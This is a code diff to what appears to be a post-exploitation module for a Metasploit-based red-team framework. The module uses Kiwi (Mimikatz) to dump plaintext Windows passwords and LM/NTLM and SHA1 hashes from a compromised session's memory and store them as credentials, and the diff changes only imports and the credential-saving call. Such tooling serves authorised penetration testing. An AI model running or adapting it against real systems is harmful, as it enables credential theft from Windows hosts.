@@ -8,6 +8,9 @@ import re
 from PostModule.module import *
 
 
+# from Lib.Module import *
+
+
 class PostModule(PostMSFRawModule):
     NAME = "获取Windows内存密码"
     DESC = "Kiwi抓取内存中的windows用户明文密码,并保存到凭证列表.\n"
@@ -26,7 +29,7 @@ class PostModule(PostMSFRawModule):
 
     def check(self):
         """执行前的检查函数"""
-        from PostModule.lib.Session import Session
+        from Lib.Module.Session import Session
         session = Session(self._sessionid)
 
         if session.is_windows is not True:
@@ -72,21 +75,16 @@ class PostModule(PostMSFRawModule):
                                                     tmpdict.get('Password'))
             self.log_good(result_str)
             tag = {'domain': tmpdict.get('Domain'), 'type': 'Password'}
-            Credential.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('Password'),
-                                      password_type='windows', tag=tag,
-                                      source_module=self.NAME, host_ipaddress=host_ipaddress,
-                                      desc='')
+            self.add_credential(username=tmpdict.get('Username'), password=tmpdict.get('Password'),
+                                password_type='windows', tag=tag)
 
         if tmpdict.get('LM') is not None and tmpdict.get('NTLM') is not None:
             result_str = "用户名:{} 域:{} LM/NTLM:{}:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
                                                             tmpdict.get('LM'), tmpdict.get('NTLM'))
             self.log_good(result_str)
             tag = {'domain': tmpdict.get('Domain'), 'type': 'Hash'}
-            Credential.add_credential(username=tmpdict.get('Username'),
-                                      password=f"{tmpdict.get('LM')}:{tmpdict.get('NTLM')}",
-                                      password_type='windows', tag=tag,
-                                      source_module=self.NAME, host_ipaddress=host_ipaddress,
-                                      desc='')
+            self.add_credential(username=tmpdict.get('Username'), password=f"{tmpdict.get('LM')}:{tmpdict.get('NTLM')}",
+                                password_type='windows', tag=tag)
 
         if tmpdict.get('SHA1') is not None:
             result_str = "用户名:{} 域:{} SHA1:{}".format(tmpdict.get('Username'), tmpdict.get('Domain'),
